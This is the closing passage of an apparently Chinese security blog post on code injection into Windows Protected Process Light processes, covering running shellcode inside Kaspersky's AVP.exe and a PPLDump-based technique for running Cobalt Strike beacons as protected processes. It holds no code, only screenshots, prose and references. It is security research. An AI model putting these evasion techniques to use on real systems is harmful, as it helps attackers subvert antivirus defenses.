![1652067468_62788c8c915aa736350f6.png!small?1652067470531](https://image.3001.net/images/20220509/1652067468_62788c8c915aa736350f6.png!small?1652067470531)

同时PPL的保护依然存在，但是我们已经可以在AVP.exe中执行任意代码，也就是注入了ppl的进程,继承了ppl的保护。

![1652067480_62788c98430261c236292.png!small?1652067481922](https://image.3001.net/images/20220509/1652067480_62788c98430261c236292.png!small?1652067481922)

也可以在卡巴安全上下文中执行我们的shellcode 例如：

![1652067491_62788ca3cb7684d7f202e.png!small?1652067493570](https://image.3001.net/images/20220509/1652067491_62788ca3cb7684d7f202e.png!small?1652067493570)

# CobaltStrike beacon_ppL

国外安全研究员将 PPLDump 漏洞利用移植到 .NET 以将 Cobalt Strike 信标作为 WinTCB PPL 运行。

  

<https://twitter.com/buffaloverflow/status/1400441642516164614>

![1652067508_62788cb467952026eb448.png!small?1652067510207](https://image.3001.net/images/20220509/1652067508_62788cb467952026eb448.png!small?1652067510207)

同样我们也实现了类型的攻击手法

# 参考资料

  * <https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services->
  * <https://www.crowdstrike.com/blog/protected-processes-part-3-windows-pki-internals-signing-levels-scenarios-signers-root-keys/>
  * <https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html>

  

  

